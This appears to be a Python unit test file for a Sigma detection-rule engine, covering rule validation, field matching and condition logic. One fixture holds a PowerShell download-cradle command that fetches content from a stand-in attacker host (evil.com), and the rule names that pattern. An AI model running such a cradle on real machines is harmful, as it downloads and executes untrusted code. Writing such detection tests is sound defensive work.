"""Unit tests for the Sigma rule validation and selection evaluation."""

import unittest
from app.models.enums import RiskLevel
from app.models.parsed_log import ParsedLog
from app.sigma.condition_parser import evaluate_condition
from app.sigma.evaluator import evaluate_selection
from app.sigma.schemas import SigmaRule


class TestSigmaCompiler(unittest.TestCase):
    def test_sigma_rule_schema_validation(self):
        raw_rule = {
            "id": "rule-powershell-cradle-001",
            "title": "Suspicious PowerShell Download Cradle",
            "logsource": {"category": "process_creation"},
            "detection": {
                "selection": {
                    "message|contains": "DownloadString",
                },
                "condition": "selection",
            },
            "level": "high",
        }
        rule = SigmaRule.model_validate(raw_rule)
        self.assertEqual(rule.title, "Suspicious PowerShell Download Cradle")
        self.assertEqual(rule.level, RiskLevel.HIGH)

    def test_evaluate_positive_match(self):
        selection = {
            "message|contains": "DownloadString",
        }
        event = ParsedLog(
            event_type="process_creation",
            raw_log="powershell.exe (New-Object Net.WebClient).DownloadString('http://evil.com')",
            message="powershell.exe -nop -c (New-Object Net.WebClient).DownloadString('http://evil.com')",
        )
        matched, field_matches = evaluate_selection(event, selection, "selection")
        self.assertTrue(matched)
        self.assertGreater(len(field_matches), 0)
        self.assertEqual(field_matches[0].field, "message")

    def test_evaluate_negative_mismatch(self):
        selection = {
            "message|contains": "DownloadString",
        }
        event = ParsedLog(
            event_type="process_creation",
            raw_log="notepad.exe C:\\notes.txt",
            message="notepad.exe C:\\notes.txt",
        )
        matched, field_matches = evaluate_selection(event, selection, "selection")
        self.assertFalse(matched)
        self.assertEqual(len(field_matches), 0)

    def test_condition_evaluation(self):
        selection_results = {"selection1": True, "selection2": False}
        self.assertTrue(evaluate_condition("selection1 or selection2", selection_results))
        self.assertFalse(evaluate_condition("selection1 and selection2", selection_results))
        self.assertTrue(evaluate_condition("1 of selection*", selection_results))


if __name__ == "__main__":
    unittest.main()
